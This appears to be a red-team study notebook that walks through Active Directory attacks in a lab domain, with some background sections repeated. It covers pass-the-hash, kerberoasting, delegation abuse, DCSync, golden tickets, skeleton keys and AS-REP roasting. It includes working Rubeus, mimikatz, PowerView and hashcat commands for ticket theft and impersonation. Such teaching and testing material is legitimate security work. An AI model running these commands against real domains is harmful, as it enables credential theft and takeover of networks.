![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FP53nOgCJedaV4tXOUaAa%2Fimage.png?alt=media&token=4f88f7ef-af01-4365-b7bd-5d7ec7e3a26d)

Ryan is an Administrator in DESKTOP-DELTA, we can grab a shell on this machine from Kali we can use the Impacket tools, some examples are PSEXEC or WMIEXEC to pass the hash and grab a shell. A good rule of thumb is whenever there is a technique and it's Remote or anything that has to do with Remote 9/10 an Administrator is needed.

From here if you notice the wmiexec help menu you can see that it asks for LMHASH: NTHASH, but mimikatz only gives us the LM hash. No need to worry here usually the hash before

:

 is an empty hash and doesn't show on mimikatz so it doesn't dump that, so to use wmiexec.py here we can just use the hash in this way

: HASH

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FlyI8DQCfKDr280ozvFkm%2Fimage.png?alt=media&token=a35ec439-3916-410f-881b-8e295e1b84e9)

The same technique can be used when working with psexec.py we can pass a hash to authenticate and the extra on this tool is that once we log in as the Administrator it will privesc to SYSTEM for us by default.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FZh2xmYSedJm7lIhamrLF%2Fimage.png?alt=media&token=12e6e28d-e838-44d3-b5b6-32f2764e1b43)

Wikipedia's page states this reason why Pass The Hash works: 

Analysis of this mechanism has shown that the cleartext password is not required to complete network authentication successfully, only the hashes are needed.

So the reason is simple windows for Authentication don't authenticate with your password!!. It hashes first and then uses the hash for authentication at a Network Level.

You can't use the hash for authentication such as Logging In, or Running as Admin [UAC]. This is at a Network Level usually when it's authenticating Remotely.

We Don't Need No Stinkin' PSExec - TrustedSec - Information Security

TrustedSec - Information Security

Expanding Your Empire - harmj0y

harmj0y

Pass the Hash Attack Tutorial | Lateral Movement using LanMan or NTLM hashes

Attack Catalog

# active-directory

What is Active Directory?

Active Directory (AD) is a directory service developed by Microsoft for Windows domain networks. It is included in most Windows Server Operating Systems as a set of processes and services. Initially, Active Directory was only in charge of centralized domain management. However, Active Directory became an umbrella title for a broad range of directory-related services.

A server running the Active Directory Domain Service (AD DS) role is called a domain controller. It authenticates and authorizes all users and computers in a Windows domain type network. Assigning and enforcing security policies for all computers and installing or updating software. For example, when a user logs into a computer that is part of a Windows domain, Active Directory checks the submitted password and determines whether the user is a system administrator or normal user. Also it allows management and storage of information, provides authentication mechanisms, and establishes a framework to deploy other related services. Active Directory uses Lightweight Directory Access Protocol (LDAP) versions 2 and 3, Microsoft's version of Kerberos and DNS.

## active-directory

What is Active Directory?

Active Directory (AD) is a directory service developed by Microsoft for Windows domain networks. It is included in most Windows Server Operating Systems as a set of processes and services. Initially, Active Directory was only in charge of centralized domain management. However, Active Directory became an umbrella title for a broad range of directory-related services.

A server running the Active Directory Domain Service (AD DS) role is called a domain controller. It authenticates and authorizes all users and computers in a Windows domain type network. Assigning and enforcing security policies for all computers and installing or updating software. For example, when a user logs into a computer that is part of a Windows domain, Active Directory checks the submitted password and determines whether the user is a system administrator or normal user. Also it allows management and storage of information, provides authentication mechanisms, and establishes a framework to deploy other related services. Active Directory uses Lightweight Directory Access Protocol (LDAP) versions 2 and 3, Microsoft's version of Kerberos and DNS.

### active-directory

What is Active Directory?

Active Directory (AD) is a directory service developed by Microsoft for Windows domain networks. It is included in most Windows Server Operating Systems as a set of processes and services. Initially, Active Directory was only in charge of centralized domain management. However, Active Directory became an umbrella title for a broad range of directory-related services.

A server running the Active Directory Domain Service (AD DS) role is called a domain controller. It authenticates and authorizes all users and computers in a Windows domain type network. Assigning and enforcing security policies for all computers and installing or updating software. For example, when a user logs into a computer that is part of a Windows domain, Active Directory checks the submitted password and determines whether the user is a system administrator or normal user. Also it allows management and storage of information, provides authentication mechanisms, and establishes a framework to deploy other related services. Active Directory uses Lightweight Directory Access Protocol (LDAP) versions 2 and 3, Microsoft's version of Kerberos and DNS.

### lightweight-directory-access-protocol

The Lightweight Directory Access Protocol (LDAP) is an open, vendor-neutral, industry standard application protocol for accessing and maintaining distributed directory information services over an internet Protocol network.

A common use of LDAP is to provide a central place to store usernames and passwords. This allows many different applications and services to connect to the LDAP server to validate users.

### kerberos

Kerberos is a computer-network authentication protocol that works on the basis of tickets to allow nodes communicating over a non-secure network to prove their identity to one another in a secure manner. Kerberos uses UDP port 88 by default.

Description

The client authenticates itself to the 

**Authentication Server**

 (

**AS**

) which forwards the username to a key distribution center (KDC). The KDC issues a 

**ticket granting ticke**

t (

**TGT**

), which is time stamped and encrypts it using the 

**ticket-granting service's**

**TGS**

) secret key and returns the encrypted result to the user's workstation. This is done infrequently, typically at user logon; the TGT expires at some point although it may be transparently renew by the user's session manager while they are logged in.

When the client needs to communicate with a service on another node (a "principal", in Kerberos parlance), the client sends the TGT to the TGS, which usually shares the same host as the KDC. The service must have already been registered with the TGS with a 

**Service Principal Nam**

e (

**SPN**

). The client uses the SPN to request access to this service. After verifying that the TGT is valid and that the user is permitted to access the requested service, the TGS issues ticket and session keys to the client. The client sends the ticket to the 

**service server**

**SS**

) along with its service request.

### forest-tress-and-domains

The Active directory framework that holds the objects can be viewed at several levels. The forest, and domain are the logical divisions an Active Directory network.

Within a deployment, objects are grouped into domains. The object for a single domain is stored in a single database (which can be replicated). Domains are identified by their DNS name structure, the namespace.

A domain is defined as a logical group of network objects (computers, users, devices) that share the same Active Directory database.

A tree is a collection of one or more domains and domain trees in a contiguous namespace and is linked in a transitive trust hierarchy.

At the top of the structure is the forest. A forest is a collection of trees that share a common global catalog, directory schema, logical structure, and directory configuration. The forest represents the security boundary within which users, groups, and other objects are accessible.

### active-directory-attacks

In this section I will work and go through some of the well-known AD Attack techniques that are commonly known or available in the environment.

## lightweight-directory-access-protocol

The Lightweight Directory Access Protocol (LDAP) is an open, vendor-neutral, industry standard application protocol for accessing and maintaining distributed directory information services over an internet Protocol network.

A common use of LDAP is to provide a central place to store usernames and passwords. This allows many different applications and services to connect to the LDAP server to validate users.

## kerberos

Kerberos is a computer-network authentication protocol that works on the basis of tickets to allow nodes communicating over a non-secure network to prove their identity to one another in a secure manner. Kerberos uses UDP port 88 by default.

Description

The client authenticates itself to the 

**Authentication Server**

 (

**AS**

) which forwards the username to a key distribution center (KDC). The KDC issues a 

**ticket granting ticke**

t (

**TGT**

), which is time stamped and encrypts it using the 

**ticket-granting service's**

**TGS**

) secret key and returns the encrypted result to the user's workstation. This is done infrequently, typically at user logon; the TGT expires at some point although it may be transparently renew by the user's session manager while they are logged in.

When the client needs to communicate with a service on another node (a "principal", in Kerberos parlance), the client sends the TGT to the TGS, which usually shares the same host as the KDC. The service must have already been registered with the TGS with a 

**Service Principal Nam**

e (

**SPN**

). The client uses the SPN to request access to this service. After verifying that the TGT is valid and that the user is permitted to access the requested service, the TGS issues ticket and session keys to the client. The client sends the ticket to the 

**service server**

**SS**

) along with its service request.

## forest-tress-and-domains

The Active directory framework that holds the objects can be viewed at several levels. The forest, and domain are the logical divisions an Active Directory network.

Within a deployment, objects are grouped into domains. The object for a single domain is stored in a single database (which can be replicated). Domains are identified by their DNS name structure, the namespace.

A domain is defined as a logical group of network objects (computers, users, devices) that share the same Active Directory database.

A tree is a collection of one or more domains and domain trees in a contiguous namespace and is linked in a transitive trust hierarchy.

At the top of the structure is the forest. A forest is a collection of trees that share a common global catalog, directory schema, logical structure, and directory configuration. The forest represents the security boundary within which users, groups, and other objects are accessible.

## active-directory-attacks

In this section I will work and go through some of the well-known AD Attack techniques that are commonly known or available in the environment.

### kerberoasting

You have an SPN service/user the attack works because by default any domain user can request a Ticket to these user's/services the Kerberos grant's a ticket, this ticket is later stored in memory and you can grab this ticket, save it offline and crack the hash file to gain clear-text credentials.

Tim Medin presented at DerbyCon 2014 a tool called Kerberoast which cracks Kerberoast TGS tickets, He determined that possession of a TGS service ticket encrypted with the RC4 provides the opportunity to take the ticket to a password cracking computer (or cloud system) and attempt to crack the service account's password. How does this work? Since the TGS Kerberos ticket is encrypted with the RC4 encryption, that means the service account's password hash is used to encrypt the ticket. The cracking system loops through converts to NTLM, and attempts to open the TGS ticket. If the TGS ticket is opened, we know the clear text password and the NTLM password for the account.

In Summary

Kerberoasting abuses traits of the Kerberos protocol to harvest password hashes for Active Directory user accounts with serviceprincipalName (SPN) values (i.e. service accounts). A user is allowed to request a ticket-granting service (TGS) ticket for any SPN, and parts of the TGS may be encrypted with the RC4 using the password hash of the service account assigned the requested SPN as the key.

An adversary who can extract the TGS ticket from memory, or capture them by sniffing network traffic, can extract the service account's password hash and attempt an offline brute force attack to obtain the plaintext password.

**Attack**

The setup for this attack can be viewed 

[here](https://medium.com/@markmotig/kerberoasting-from-setup-to-cracking-3e8c980f26e8)

​

Now will use a few methods to search for any Kerberoastable Users. This can be done with any domain user this attack is abused since any domain user can request a ticket for an SPN account we verify our domain account

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FZdXCuPEZb4567TAUhdSa%2Fimage.png?alt=media&token=049e42a9-72ed-4f47-b19c-5a05e6475119)

I will continue with the Rubeus tool and request for the ticket of the specific user, we can use Rubeus to find kerberoastable users without kerberoasting and leaving many requests done by our user for a kerberoast some opsec to consider this won't show which user is kerberoastable but how many are available.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FpZGTYmdhcQUZp2kqURSZ%2Fimage.png?alt=media&token=17efd774-f86b-4f20-aab4-b889582245b3)

Now we can request the tickets from the users and choose the format-specific for our cracking tool which this preference would be hashcat

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2Fk6DJbOgkLJUs4EgW5f3K%2Fimage.png?alt=media&token=007dd445-0a0c-4ffb-ab5e-c428fbb758b0)

Now with this available, we can crack the password offline utilizing hashcat, once sent to our cracking rig we can use wordlists to attack this hash and try cracking it with this one we managed to get the password by utilizing the RockYou wordlist with a ruleset.

hashcat.exe -m 13100 -a 0 hashes wordlist

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FRaQ9jCEf1f3pCsdrUSvZ%2Fimage.png?alt=media&token=62bf2577-e556-436a-8db6-6d9bd40bfd71)

### unconstrained-delegation

When a user accesses a server with unconstrained delegation enabled, the user sends their TGT to the server. The server can then impersonate the user by using their user's TGT to authenticate to other services in the network.

But what is delegation? Delegation is a feature in Active Directory that allows a user or a computer to impersonate another account. Microsoft had to provide a simple mechanism to support scenarios where a user authenticates to a Web Server via Kerberos and needs to update records on a back-end database server on behalf of the user. This is typically referred to as the "Kerberos double-hop issue" and requires delegation.

**What the risk?**

Once you turn on unconstrained delegation to a computer, any time an account connects to that computer for any reason, their ticket (TGT) is stored in memory so it can be used later by the computer for impersonation. Let's say you enable this option on a computer you have administrative access to and then get a Domain Admin user to access the computer over the Common Internet File System (CIFS) by accessing a shared folder. Without unconstrained delegation on, only the ticket-granting server (TGS) would be stored in memory on your compromised machine. This ticket gives access only to the CIFS service on your machine so you can't use it to move laterally. However, with unconstrained delegation enabled, when the privileged user connects to your machine, their TGT will be stored in memory, which can be replayed to move laterally and compromise a domain controller.

TL;DR

As we mentioned before what is the risk to having Unconstrained Delegation, is that anytime an account connects to the compromised computer for any reason, their ticket (TGT)is stored in memory so it can be used later by the computer for impersonation.

**Attack**

First to setup this attack path this needs to be done from the DC, we right click on the PC name and "Trust this computer for delegation to any service (Kerberos only)" option checked.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MWuJS6etavExXrFJWrE%2F-MWuJ_qVSX7EFvxtxp8n%2Fimage.png?alt=media&token=a32b696b-4531-4e1d-8160-3116af5d6829)

Now it's time to search for the machine that has the Unconstrained Delegation available for it. We find this with utilizing PowerView

Get-NetComputer -Unconstrained

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MWuJS6etavExXrFJWrE%2F-MWuJavj5WlW-W9dA-20%2Fimage.png?alt=media&token=650cbf15-8e53-46f4-8114-02ccc77bea89)

Now let's say our goal is to reach Desktop-Alpha and we have no permissions to access the machine.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MWuJS6etavExXrFJWrE%2F-MWuJbiQ-eWp5YJIDO7l%2Fimage.png?alt=media&token=5c99d44b-782d-4970-99d4-151610499c93)

**Administrator Privileges from here**

Now we will need to elevate our privileges on the host machine to start capturing tickets once that is done we have to wait for a user that has access to Desktop-Alpha and we can use the ticket to access the target machine (For the sake of Demo I will have a user access a folder on Desktop-Charlie)

We run Rubeus in monitor mode, I used an interval of 10 seconds  after this I managed to capture the ticket.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MWuJS6etavExXrFJWrE%2F-MWuJcZmJhKMhkyK-494%2Fimage.png?alt=media&token=d6c6c1dd-6ac0-432c-902d-e9f71957bc08)

Successfully done this I will save the ticket then pass it onto my current session.

Rubeus ptt /ticket:<TICKET BASE64>

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MWuJS6etavExXrFJWrE%2F-MWuJdheJqpvobwCOE9y%2Fimage.png?alt=media&token=207fe52b-26d7-44a2-917c-43e627402070)

Then we try and list the C$ share on the machine and we are successful

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MWuJS6etavExXrFJWrE%2F-MWuJeXVheD6H6EZizZY%2Fimage.png?alt=media&token=01280fa0-69e5-4243-8085-8a6ee3aeee35)

We are aware this user is a Local Administrator to the Machine so we can also grab a shell. Will create a process for this and inject our ticket to this PID so we are allowed to do Network Actions

Rubeus createnetonly /program:C:\Windows\System32\cmd.exe

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MWuJS6etavExXrFJWrE%2F-MWuJf_sT227fMhZm3Zb%2Fimage.png?alt=media&token=a764d934-0704-4362-ade0-e3bcab9130b9)

Then we will inject the ticket in the newly created process take a note in the LUID

Rubeus ptt /luid:0x302756 /ticket:<TICKET BASE64>

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MWuJS6etavExXrFJWrE%2F-MWuJgal7wcr3uQLHITY%2Fimage.png?alt=media&token=124fe3a9-eb8d-4ae0-a8d5-21ee46c8df72)

Now Impersonate the Process

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MWuJS6etavExXrFJWrE%2F-MWuJjU4R3PaUGKzHI1C%2Fimage.png?alt=media&token=3efdd776-460d-4d2e-84b4-53fccf61401a)

With this we can use PSEXEC to gain a Shell on the remote machine

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MWuJS6etavExXrFJWrE%2F-MWuJigtHjfKWy34FFB2%2Fimage.png?alt=media&token=ee7be3c1-233b-47b7-9143-f8f444c2f717)

And we get a new Grunt on the Target Machine as SYSTEM (PSEXEC does this since it’s a service and these run with the highest privileges)

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MWuJS6etavExXrFJWrE%2F-MWuJkuAp_nZAPuOIRXz%2Fimage.png?alt=media&token=59c1981d-dfbc-45ea-be5a-8637e7c6521a)

WHOAMI, HOSTNAME

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MWuJS6etavExXrFJWrE%2F-MWuJlXQ1niTUJ4LOVWD%2Fimage.png?alt=media&token=2b57240b-4292-4c6e-9d80-95d77eece8b2)

Now that we understand unconstrained delegation this is not the only user we can impersonate on this machine I used this sample since the user was a LOCAL Administrator on the target machine, usually when using this attack we are trying to impersonate Domain Admins but the truth is we can use any user that helps us reach our goal.

### constrained-delegation

Constrained Delegation is a way to limit exactly what services a particular machine/account can access while impersonating other users. The "service" specified is a service principal name that the account is allowed to access while impersonating other users. PowerView can help in locating these attributes, the field of interest is the msds-allowedtodelegateto, but there's also a modification to the accounts' userAccountControl property. Essentially, if a computer/user object has a userAccountControl value containing TRUSTED_TO_AUTH_FOR_DELEGATION then anyone who compromises that account can impersonate any user to the SPNs set in the msds-allowedtodelegateto. Benjamin Delpy metioned that SeEnableDelegationPrivilege being required to actually modify the parameters.

**What's the Risk?**

If you are able to compromise a user account with SPNs set under msds-allowedtodelegateto can pretend to be any user they want to the target service SPN. For the HOST SPN this allows complete remote takeover. For MSSQL SPN this would allow DBA rights. A CIFS SPN would allow complete remote file access. A HTTP SPN this would likely allow for the takeover of the remote web-service, and LDAP allows for DCSync. HTTP/SQSL service accounts, even if they aren't elevated admin on the target, can possibly be abused with Rotten potato to elevate right to SYSTEM.

**Attack**

First let us start using PowerView in the below screenshot you may see that the user jwick is allowed to delegate or in other words impersonate any user and authenticate to a file system.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MWuJn7PhTK7ITHZ9MnT%2F-MWuJxWcLuXLjrpCWqwB%2Fimage.png?alt=media&token=28bb0d45-12f6-4824-adf8-b632b6df4cde)

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MWuJn7PhTK7ITHZ9MnT%2F-MWuJyWaQj8AS0VFrqOm%2Fimage.png?alt=media&token=2b67d10d-f985-4aac-b231-48405e6516e1)

We liked to focus onto the section for msds-allowedtodelegateto

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MWuJn7PhTK7ITHZ9MnT%2F-MWuK-INy3w_HgGDKUmi%2Fimage.png?alt=media&token=f687e759-daf3-4b9f-a49e-8a961d549c48)

Now let use dump some tickets and find the correct one for the station we are trying to access .Let's now request a delegation TGT for the user jwick

Rubeus tgtdeleg

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MWuJn7PhTK7ITHZ9MnT%2F-MWuK0Cp5Lyj2jlOhXNQ%2Fimage.png?alt=media&token=73d6ce0c-388b-44b7-9bba-f5382cc90454)

From here we will use the s4u attack from Rubeus to impersonate a user that has administrator access to the machine Desktop-Delta and continue from there, we want to change the service to CIFS to allow us to list the directories:

Rubeus s4u /ticket:<Ticket from TGTDELEG>  /domain:dominioncyber.local /impersonateuser:jwinchester /msdsspn:http/desktop-delta.dominioncyber.local /dc:dominioncyberdc.dominioncyber.local /ptt /altservice:cifs

TIP: REMOVE THE DOMAIN FROM THE MSDSSPN,  CAREFUL SOMETIMES THE MSDSSPN SECTION WILL ALSO BE ENCAPSULATED IN DOUBLE QUOTES (" ")

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MWuJn7PhTK7ITHZ9MnT%2F-MWuK1XajrrmkyT6zHIC%2Fimage.png?alt=media&token=ed665704-1e75-42df-a72f-64359843a57a)

Above once we receive the "Ticket successfully imported!" message we can copy the 2nd ticket from the output for later compromise if needed 

**"Remember these are time based"**

From here we can create a process using Rubeus, inject the ticket to that process and allow us network actions.

**Administrator Privileges from here this is only needed to perform netowrk actions**

Rubeus createnetonly /program:C:\Windows\System32\cmd.exe

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MWuJn7PhTK7ITHZ9MnT%2F-MWuK2WhYLgDap1SUakk%2Fimage.png?alt=media&token=f5d3d93f-ba38-462e-82bc-cac539d0cf74)

We save this information and now ptt onto the LUID and then impersonate the process

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MWuJn7PhTK7ITHZ9MnT%2F-MWuK3h2uiF4U5PHY7OC%2Fimage.png?alt=media&token=2249994a-8308-46e4-bd8e-4889b1c17c17)

Now impersonate the process

And for some strange reason I would receive something like this

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MWuJn7PhTK7ITHZ9MnT%2F-MWuK4oB-C3Ix2TosCYR%2Fimage.png?alt=media&token=9e08d7e8-2013-4090-800d-a6b68ac00afc)

So I did some research and found that ired.team had the same issues and requested the ticket in a different way by removing the DOMAIN from the msdsspn section

**/impersonateuser:jwinchester /msdsspn:cifs/DESKTOP-DELTA /ptt **

**[Removed some sections of the original command]**

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MWuJn7PhTK7ITHZ9MnT%2F-MWuK5yRE2e_UyI2boeg%2Fimage.png?alt=media&token=8a68818d-57d1-4a1a-9590-504c4bd35894)

By doing that change I managed to enumerate the shares as I am aware jwick is an Administrator on station Delta.

### dcsync

The concept of DCSync is that it impersonates a Domain Controller to request all the hashes of the users in the domain. Yes. This means as long as you have permissions, you do not need to run any commands on the Domain Controller the need to compromise the DC is not necessary as this one is usually quite difficult

For this to work, it is important to have proper permissions to pull hashes from a Domain Controller. Generally limited to the Domain Admins, Enterprise Admins, Domain Controller Groups, and anyone with the Replicating Changes permissions set to Allow (i.e. Replicating Changes All/Replicating Directory Changes), DCSync will allow your user to perform this attack with the use of mimikatz.

**What's the risk?**

Well if a user can impersonate a Domain Controller and request for all the domain user's passwords, that is enough risk.

**Attack**

We can enumerate a user with these permission with powerview by using the Get-ObjectACL CMDLET

**Get-ObjectAcl -Identity "dc=dominioncyber,dc=local" -ResolveGUIDs | ? {$_.SecurityIdentifier -match "S-1-5-21-1827981533-2463545078-1305764163-1120"}**

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MWuK79aDl7rD5vp7dlW%2F-MWuKEfD0Bh7SmnK2Qop%2Fimage.png?alt=media&token=40330bc9-843c-44b2-bde1-ee9555257293)

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MWuK79aDl7rD5vp7dlW%2F-MWuKFNEYNVUAmTgIDXP%2Fimage.png?alt=media&token=661a156a-bcf6-41e6-83c1-454e6020f66e)

Above, when locating these 2 objects DCSync is allowed for the user. This is as simple as running DCSync <username> on Covenant and grabbing the hashes for the krbtgt user.

It also has a sample on what command is being executed when utilizing mimikatz

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MWuK79aDl7rD5vp7dlW%2F-MWuKGRJKzor3xsgEn-K%2Fimage.png?alt=media&token=363f7cca-3eb0-46ef-85bf-5a6a203fef13)

And we can do this for any user of our choosing in the entire Domain

Jwick

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MWuK79aDl7rD5vp7dlW%2F-MWuKHJTV1qvSqH4cb0t%2Fimage.png?alt=media&token=5d230f54-6269-408a-9221-124ebfa78b11)

Understanding this technique and exploiting is valuable as this can provide persistence with the highest privileges on the Domain and can be also used to initiate other techniques such as Golden/Silver Tickets.

### golden-tickets

The KRBTGT Account, every Active Directory Domain Controller is responsible for handling Kerberos Ticket requests, which are used to authenticate users and grant them access to computers and applications. The KRBTGT account is used to encrypt and sign all Kerberos tickets within a domain, and a domain controllers use the account password to decrypt Kerberos tickets for validation. This account password never changes, and the account name is the same in every domain, so it's a well-known target for attackers.

**What's the risk?**

Once an attacker compromises the KRBTGT account they can create forged Kerberos tickets (TGTs) which can be used to request TGS tickets for any service on any computer in the domain. But remember the hardest part of this attack is you need Administrator Access to the DC (Domain Controller), these attacks are hard to detect because they are valid TGTs.

For Demo purposes we have the KRBTGT Hash and a Shell  with the user Mgarcia, if we enumerate the DC Directory we don't have access.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MWuKRcrptTRJIIUwTIV%2F-MWuKTt9ie5HdsurK_4R%2Fimage.png?alt=media&token=9e90cea7-a097-4856-8a88-386d08481eae)

Now let us use the binary form of mimikatz as there is no way that I am familiar with that this technique will work straight from Covenant I move to a local CMD (you can also use RDP if available and probably PSRemoting), we will first need the SID of the User and the KRBTGT hash

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MWuKRcrptTRJIIUwTIV%2F-MWuKUhlTWl0s5O5k5XW%2Fimage.png?alt=media&token=5d0f7c60-0916-4d4c-bb12-e3aec4edcdc4)

We will copy everything but the last 4 digits as they identify the user and we want to replace that with a 500 SID user. In our previous attack DCSync we grabbed the KRBTGT hash so we can skip this, as the user had DCSync permissions it was easy to grab without compromising the DC.

And now we will use the command for mimikatz to grab and pass the ticket onto our current session.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MWuKRcrptTRJIIUwTIV%2F-MWuKVfYUntEbvU6LCRe%2Fimage.png?alt=media&token=71142320-4512-4d15-bdbd-ec1114740537)

Once we execute the command successfully, we can enumerate the C Drive from the DC.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MWuKRcrptTRJIIUwTIV%2F-MWuKWbciGUC_Cf45WEt%2Fimage.png?alt=media&token=f05b52dc-59a7-4216-8d29-d08e3573dc6f)

As you can see now with the KRBTGT Account's NTLM Hash we can forge ticket to any user or create our own and give them the highest privileges on the Domain, this is a great method for persistence

### silver-tickets

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MWuKkrf-b0f4PEoQ6Nr%2F-MWuL1taskEejOK7ROSn%2Fimage.png?alt=media&token=f9ea2861-a7ca-489a-8f7d-cfad2bb37ab5)

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MWuKkrf-b0f4PEoQ6Nr%2F-MWuMF1D1_0MzJMZbkr9%2Fezgif.com-gif-maker.gif?alt=media&token=4c3758b2-21c8-4939-882d-2a40a7dda529)

### skeleton-keys

The Skeleton Key malware "patches" the security system enabling a new master password to be accepted for any domain user, including admins.

This enables the attacker to logon as any user they want with the master password (skeleton key) configured in the malware.

"Joe User" logs in using his usual password with no changes to his account. The attacker can log in as Joe using the skeleton key password and it is seen as a valid logon.

**Attack**

In order to perpetrate this attack, the attacker must have Domain Admin rights. This attack must be performed on each and every domain controller for complete compromise, but even targeting a single domain controller can be effective. Rebooting a domain controller will remove this malware and it will have to be redeployed by the attacker.

To start the attack we can simply use mimkatz as it has this technique available a few command lines and we can reach our goal

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MWuKhOo68FH3uF6rWDj%2F-MWuKjGRd6N9wTL2-E-9%2Fimage.png?alt=media&token=4ae9a406-7d84-41c7-b3ef-d7c63ec5fa15)

Now we can access anywhere on our Domain with the default password "mimikatz" and we can authenticate utilizing any of the Domain Admins available in the Domain.

**This will work for any user not just Domain Admins, this is a Master Password for everyone.**

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MWuKhOo68FH3uF6rWDj%2F-MWuKkFMUZ_0Z04LkpNO%2Fimage.png?alt=media&token=0ba26f5d-cb0a-4dd7-b6a4-eea1dfd29c5e)

We do have to take in consideration that this technique will stop working when the DC is rebooted, as this will patch the "lsass.exe" in memory and once rebooted this will stop.

### as-rep-roasting

AS-REP Roasting is an attack against Kerberos for user accounts that do not require preauthentication. This is explained in pretty thorough detail in HarmJ0y's post. Pre-Authentication is the first step in Kerberos authentication and is designed to prevent brute-force password guessing attacks.

During preauthentication, a user will enter their password which will be used to encrypt a timestamp, and then the domain controller will attempt to decrypt it and validate that the right password was used and that it is not replaying previous requests. From there the TGT will be issued for the user to use for future authentication. If preauthentication is disabled, an attacker could request authentication data for any user and the DC would return an encrypted TGT that can be brute-forced offline.

**What's the risk?**

If we can enumerate accounts in a Windows domain that do not require Kerberos preauthentication, we can now easily request a piece of encrypted information for the accounts and crack the material offline, gaining clear text credentials.

**Attack**

Rubeus allows us to simplify this attack by using the asreproast parameter on the tool, this will find all users with the vulnerability and request a ticket

